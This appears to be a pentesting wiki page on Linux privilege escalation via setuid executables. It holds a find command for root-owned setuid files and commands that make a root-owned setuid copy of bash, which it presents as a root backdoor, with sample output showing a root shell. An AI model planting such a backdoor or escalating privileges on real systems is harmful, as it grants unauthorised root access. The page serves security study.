---
title: setuid
description: Leverage executables with setuid permissions to escalate privileges
categories: [Privilege Escalation]
tags: [Privilege Escalation, Linux, setuid]
weight: 2
---
The **Set User IP upon Execution (setuid)** permission can allow a user to execute a program or script with the permission of another user, typically with elevated privileges.

We may use the following command to find `setuid` files owned by root. Note that setuid executables will be marked with `s`.
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

If one of the executables listed above allows command to be executed, it can be leveraged for privilege escalation and execute commands as root.
- We may use a resource like [GTFOBins](https://gtfobins.org/), or research vulnerabilities associated with the executable.

## Bash with Setuid
When ran with `-p`, Bash retains the effective user ID of the owner of the binary. Creating a copy of Bash owned by root with setuid bit set can have two applications:
1. For creating a backdoor that allows any user on the system to run commands as root.
2. Escalating the ability to read/write file as root on the host system to the ability to execute commands as root.

Use the following commands to create a copy of Bash in the current directory with setuid owned by root, executable by everyone, and with setuid bit set.
```bash
cp $(which bash) .
chown root:root ./bash
chmod 4755 ./bash
```

Then, simply run `./bash -p`:
```shell-session
$ ./bash -p
# whoami
root
```
